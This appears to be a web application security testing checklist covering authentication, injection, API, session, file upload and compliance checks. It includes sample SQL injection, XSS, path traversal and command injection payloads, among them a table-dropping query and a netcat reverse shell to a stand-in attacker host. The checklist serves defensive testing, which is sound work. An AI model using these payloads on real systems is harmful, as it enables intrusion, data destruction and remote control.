# Security Testing Checklist

## 🔒 Authentication & Authorization

### Authentication Tests
- [ ] Test login with valid credentials
- [ ] Test login with invalid credentials
- [ ] Test login with SQL injection attempts
- [ ] Test login with XSS payloads
- [ ] Test password reset functionality
- [ ] Test account lockout after failed attempts
- [ ] Test session timeout
- [ ] Test concurrent sessions
- [ ] Test logout functionality
- [ ] Test token expiration
- [ ] Test refresh token mechanism
- [ ] Test "remember me" functionality

### Authorization Tests
- [ ] Test role-based access control (RBAC)
- [ ] Test accessing resources without authentication
- [ ] Test accessing resources with insufficient privileges
- [ ] Test privilege escalation attempts
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation
- [ ] Test API endpoint authorization
- [ ] Test file access authorization
- [ ] Test admin panel access controls

## 🛡️ Input Validation

### SQL Injection Tests
- [ ] Test all input fields with SQL injection payloads
- [ ] Test login forms
- [ ] Test search functionality
- [ ] Test filters and sorting parameters
- [ ] Test URL parameters
- [ ] Test POST/PUT request bodies
- [ ] Test stored procedures
- [ ] Test error messages for SQL information disclosure

**Sample Payloads:**
```sql
' OR '1'='1
'; DROP TABLE users--
' UNION SELECT NULL--
1' ORDER BY 1--
```

### Cross-Site Scripting (XSS) Tests
- [ ] Test reflected XSS in all input fields
- [ ] Test stored XSS in user profiles
- [ ] Test DOM-based XSS
- [ ] Test XSS in file uploads (SVG, HTML)
- [ ] Test XSS in URL parameters
- [ ] Test XSS in headers
- [ ] Test XSS bypass filters

**Sample Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
javascript:alert('XSS')
```

### Command Injection Tests
- [ ] Test file upload functionality
- [ ] Test file download functionality
- [ ] Test image processing features
- [ ] Test document generation
- [ ] Test email functionality
- [ ] Test export features

**Sample Payloads:**
```bash
; ls -la
| whoami
`cat /etc/passwd`
$(nc -e /bin/bash attacker.com 1234)
```

### Path Traversal Tests
- [ ] Test file access with `../` sequences
- [ ] Test file download endpoints
- [ ] Test file upload paths
- [ ] Test include/require vulnerabilities

**Sample Payloads:**
```
../../etc/passwd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## 🌐 API Security

### REST API Tests
- [ ] Test all HTTP methods (GET, POST, PUT, DELETE, PATCH)
- [ ] Test API rate limiting
- [ ] Test API authentication
- [ ] Test API authorization
- [ ] Test CORS configuration
- [ ] Test parameter tampering
- [ ] Test mass assignment vulnerabilities
- [ ] Test API versioning
- [ ] Test excessive data exposure
- [ ] Test lack of resource limiting

### GraphQL Tests (if applicable)
- [ ] Test introspection queries
- [ ] Test depth limiting
- [ ] Test query complexity limiting
- [ ] Test batching attacks
- [ ] Test field suggestions

## 🔐 Cryptography

### Encryption Tests
- [ ] Test password hashing (should use bcrypt/Argon2)
- [ ] Test sensitive data encryption at rest
- [ ] Test encryption in transit (HTTPS)
- [ ] Test SSL/TLS configuration
- [ ] Test certificate validation
- [ ] Test weak cipher suites
- [ ] Test JWT token security
- [ ] Test API key storage

### Tools:
```bash
# Test SSL/TLS
nmap --script ssl-enum-ciphers -p 443 your-domain.com

# Test HTTP headers
curl -I https://your-domain.com

# Test certificates
openssl s_client -connect your-domain.com:443
```

## 🍪 Session Management

- [ ] Test session fixation
- [ ] Test session hijacking
- [ ] Test cookie security flags (HttpOnly, Secure, SameSite)
- [ ] Test session timeout
- [ ] Test concurrent session handling
- [ ] Test session storage security
- [ ] Test logout functionality

## 📝 Business Logic

- [ ] Test payment bypass
- [ ] Test discount code manipulation
- [ ] Test quantity manipulation
- [ ] Test race conditions
- [ ] Test workflow bypass
- [ ] Test negative values
- [ ] Test boundary values
- [ ] Test business rule violations

## 📤 File Upload Security

- [ ] Test file type validation
- [ ] Test file size limits
- [ ] Test malicious file upload (shell scripts)
- [ ] Test double extension files (.jpg.php)
- [ ] Test MIME type validation
- [ ] Test file content validation
- [ ] Test path traversal in uploads
- [ ] Test virus/malware upload

## 🔍 Information Disclosure

- [ ] Test error messages for sensitive information
- [ ] Test stack traces exposure
- [ ] Test directory listing
- [ ] Test source code disclosure
- [ ] Test backup file access
- [ ] Test version information exposure
- [ ] Test API documentation exposure
- [ ] Test .git folder exposure
- [ ] Test environment files (.env)

## 🌍 HTTP Security Headers

Check presence and configuration:
- [ ] Content-Security-Policy
- [ ] X-Frame-Options
- [ ] X-Content-Type-Options
- [ ] Strict-Transport-Security (HSTS)
- [ ] X-XSS-Protection
- [ ] Referrer-Policy
- [ ] Permissions-Policy

**Test with:**
```bash
curl -I https://your-domain.com | grep -i "x-\|content-security\|strict-transport"
```

## 🚨 Cross-Site Request Forgery (CSRF)

- [ ] Test CSRF token presence
- [ ] Test CSRF token validation
- [ ] Test CSRF in state-changing operations
- [ ] Test CSRF token reuse
- [ ] Test CSRF bypass techniques

## 📱 Client-Side Security

- [ ] Test for sensitive data in JavaScript
- [ ] Test for hardcoded credentials
- [ ] Test for API keys in frontend code
- [ ] Test localStorage/sessionStorage usage
- [ ] Test third-party library vulnerabilities
- [ ] Test source map exposure

## 🗄️ Database Security

- [ ] Test parameterized queries usage
- [ ] Test stored procedure security
- [ ] Test database user privileges
- [ ] Test connection string security
- [ ] Test database encryption
- [ ] Test backup security

## 🔧 Configuration & Deployment

- [ ] Test default credentials
- [ ] Test admin interfaces accessibility
- [ ] Test debug mode disabled in production
- [ ] Test error handling configuration
- [ ] Test logging configuration
- [ ] Test security misconfigurations
- [ ] Test outdated software versions

## 📊 Testing Tools

### Automated Scanners
- [ ] **OWASP ZAP**: Web application security scanner
- [ ] **Burp Suite**: Web vulnerability scanner
- [ ] **Nikto**: Web server scanner
- [ ] **SQLMap**: SQL injection tool
- [ ] **Nmap**: Network scanner
- [ ] **Snyk**: Dependency vulnerability scanner
- [ ] **SonarQube**: Code quality and security

### Manual Testing Tools
- [ ] **Postman**: API testing
- [ ] **cURL**: Command-line HTTP client
- [ ] **Browser DevTools**: Network analysis
- [ ] **JWT.io**: JWT token analysis

## 📋 Compliance Checks

### OWASP Top 10 (2021)
- [ ] A01:2021 - Broken Access Control
- [ ] A02:2021 - Cryptographic Failures
- [ ] A03:2021 - Injection
- [ ] A04:2021 - Insecure Design
- [ ] A05:2021 - Security Misconfiguration
- [ ] A06:2021 - Vulnerable and Outdated Components
- [ ] A07:2021 - Identification and Authentication Failures
- [ ] A08:2021 - Software and Data Integrity Failures
- [ ] A09:2021 - Security Logging and Monitoring Failures
- [ ] A10:2021 - Server-Side Request Forgery (SSRF)

### GDPR (if applicable)
- [ ] Data encryption
- [ ] Right to be forgotten
- [ ] Data portability
- [ ] Consent management
- [ ] Data breach notification

### PCI DSS (if handling payments)
- [ ] Cardholder data protection
- [ ] Secure transmission
- [ ] Access control
- [ ] Monitoring and testing

## 🎯 Testing Schedule

- **Daily**: Automated dependency scans (Snyk)
- **Weekly**: Automated security scans (OWASP ZAP)
- **Monthly**: Manual penetration testing
- **Quarterly**: Full security audit
- **After Major Updates**: Comprehensive security testing

## 📝 Reporting

For each vulnerability found, document:
1. **Severity**: Critical/High/Medium/Low
2. **Description**: What is the vulnerability?
3. **Impact**: What could an attacker do?
4. **Steps to Reproduce**: Detailed reproduction steps
5. **Proof of Concept**: Screenshots/code samples
6. **Remediation**: How to fix it
7. **References**: CVE, CWE, OWASP links

## ✅ Sign-off

- [ ] All critical vulnerabilities fixed
- [ ] All high vulnerabilities fixed or accepted
- [ ] Security testing documentation complete
- [ ] Penetration test report generated
- [ ] Development team trained on findings
- [ ] Production deployment approved
